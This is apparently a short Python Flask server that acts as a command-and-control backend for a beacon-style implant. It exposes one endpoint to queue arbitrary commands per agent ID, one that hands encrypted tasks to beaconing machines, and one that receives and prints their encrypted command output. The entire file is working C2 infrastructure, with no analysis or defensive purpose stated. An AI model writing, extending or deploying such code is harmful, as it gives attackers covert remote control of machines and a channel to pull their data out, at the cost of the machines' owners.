from flask import Flask, request, jsonify, send_file
from beacon import SECRET_KEY, cipher, decrypt_data, encrypt_data
import time, json
from cryptography.fernet import Fernet

app = Flask(__name__)

tasks = {} # We will have to turn this into a database of pre-configured tasks later

############################################################################

@app.route('/api/push', methods=['POST'])
def push(): # Queues tasks if a request is sent to this endpoint
    agent_id = request.json.get('id')  
    command = request.json.get('command') 
    if agent_id not in tasks: 
        tasks[agent_id] = [] 
    tasks[agent_id].append(command) 
    return jsonify({"status": "task queued"}) 

############################################################################

@app.route('/api/status', methods=['POST']) # 
def status(): # If a machine beacons to this endpoint, it queries status (on if there are any tasks/things to do)
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)
    agent_id = beacon_info.get('id')

    task = tasks.pop(agent_id, None)
    response = {"task": task} if task else {"task": None}

    encrypted_response = encrypt_data(json.dumps(response))
    return jsonify({"data": encrypted_response})

############################################################################

@app.route('/api/upload', methods=['POST']) 
def upload(): # Shows the results of the tasks executed when visited

    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)
    agent_id = result_info.get('id')
    output = result_info.get('output')
    print(f"[+] Result from {agent_id}: {output}")
    return jsonify({"status": "received"}) 

############################################################################

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)